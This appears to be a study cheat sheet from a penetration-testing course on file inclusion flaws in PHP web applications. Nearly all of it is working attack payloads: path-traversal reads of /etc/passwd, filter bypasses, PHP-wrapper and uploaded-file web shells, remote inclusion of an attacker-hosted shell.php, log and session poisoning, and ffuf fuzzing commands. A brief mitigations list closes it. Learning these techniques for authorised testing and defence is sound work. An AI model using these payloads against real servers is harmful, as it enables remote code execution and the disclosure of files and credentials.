# File Inclusion

## 🎯 Main Idea
- File inclusion flaws occur when user input reaches a file-loading function, letting an attacker include local or remote files.
- `LFI` discloses local files/source and can escalate to RCE; `RFI` includes attacker-hosted code for direct RCE.
- Impact depends on the function's capabilities (Read / Execute / Remote URL) — e.g. PHP `include()` does all three.
- Module covers LFI, filter/bypass tricks, PHP filters & wrappers, RFI, upload-based inclusion, log poisoning, and automation.

## 💥 Attack / Exploit Vectors

### Local File Inclusion (LFI)
- Include local files via the vulnerable parameter, using path traversal or an approved-path prefix.
- **Commands**
  - `/index.php?language=/etc/passwd` — basic LFI
  - `/index.php?language=../../../../etc/passwd` — LFI with path traversal
  - `/index.php?language=./languages/../../../../etc/passwd` — traverse starting from an approved path

### Basic Bypasses
- Defeat naive filters and appended extensions with encoding, non-recursive stripping, truncation, or null bytes.
- **Commands**
  - `/index.php?language=....//....//....//....//etc/passwd` — bypass non-recursive `../` stripping
  - `/index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64` — URL-encoded traversal
  - `/index.php?language=../../../../etc/passwd%00` — null-byte to drop appended extension (obsolete)
  - `/index.php?language=non_existing_directory/../../../etc/passwd/./././.[./ REPEATED ~2048 times]` — path truncation (obsolete)

### PHP Filters (source disclosure)
- Base64-encode PHP source so it is returned instead of executed.
- **Commands**
  - `/index.php?language=php://filter/read=convert.base64-encode/resource=config` — read PHP source via base64 filter

### PHP Wrappers (RCE)
- `data://` and `php://input` inject PHP code (need `allow_url_include=On`); `expect://` runs commands directly (needs expect module).
- **Commands**
  - `/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id` — RCE with data wrapper
  - `curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id"` — RCE with input wrapper
  - `curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"` — RCE with expect wrapper
  - `curl ".../index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"` then `base64 -d | grep allow_url_include` — confirm wrapper prerequisites

### Remote File Inclusion (RFI)
- If remote URLs are allowed, include an attacker-hosted PHP web shell for RCE.
- **Commands**
  - `echo '<?php system($_GET["cmd"]); ?>' > shell.php && python3 -m http.server <LISTENING_PORT>` — host the web shell
  - `/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id` — include the remote web shell

### LFI + File Uploads
- Smuggle PHP inside an uploaded image/zip/phar, then include it for RCE (works even when RFI is off).
- **Commands**
  - `echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif` — craft malicious image
  - `/index.php?language=./profile_images/shell.gif&cmd=id` — RCE via uploaded image
  - `echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php` — craft malicious zip
  - `/index.php?language=zip://shell.zip%23shell.php&cmd=id` — RCE via zip wrapper
  - `php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg` — craft malicious phar
  - `/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id` — RCE via phar wrapper

### Log Poisoning
- Write PHP into a readable, controllable log/session, then include it (requires Execute + read access).
- Sources: PHP session files, Apache/Nginx `access.log` (`User-Agent`), `/proc/self/environ`, sshd/mail/vsftpd logs.
- **Commands**
  - `/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd` — read/locate the PHP session file
  - `/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E` — poison the session with a web shell (via `?language=`)
  - `/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id` — RCE through poisoned session
  - `curl -s "http://<SERVER_IP>:<PORT>/index.php" -A '<?php system($_GET["cmd"]); ?>'` — poison server log via User-Agent
  - `/index.php?language=/var/log/apache2/access.log&cmd=id` — RCE through poisoned Apache log

### Automated Scanning / Fuzzing
- Fuzz parameters, LFI payloads, webroot paths, and server configs with ffuf.
- **Commands**
  - `ffuf -w .../burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287` — fuzz for vulnerable parameters
  - `ffuf -w .../LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287` — fuzz LFI payloads
  - `ffuf -w .../default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287` — fuzz webroot path
  - `ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287` — fuzz server config files

## 🛠️ Key Tools & Concepts
- **File inclusion functions** — PHP `include()/require()`, `file_get_contents()`; NodeJS `res.render()`; Java `import`; .NET `include` (vary by Read/Execute/Remote-URL capability).
- **PHP wrappers/filters** — `php://filter`, `data://`, `php://input`, `expect://`, `zip://`, `phar://`.
- **ffuf** — parameter/payload/path fuzzing (`-fs` to filter by response size).
- **SecLists LFI wordlists** — LFI-Jhaddix.txt, webroot and server-config lists (Linux/Windows).
- **allow_url_include / allow_url_fopen** — PHP settings that gate data/input wrappers and RFI.

## 🛡️ Mitigations
- Avoid passing user input to file-inclusion functions; load assets without user interaction.
- Use a strict whitelist mapping inputs to allowed files, with a safe default.
- Prevent traversal with framework natives (e.g. PHP `basename()`) and recursive `../` stripping.
- Disable `allow_url_fopen`/`allow_url_include`; set `open_basedir`; disable dangerous modules (PHP Expect, mod_userdir); sandbox with Docker.
- Deploy a WAF (e.g. ModSecurity, permissive mode) and monitor logs continuously.
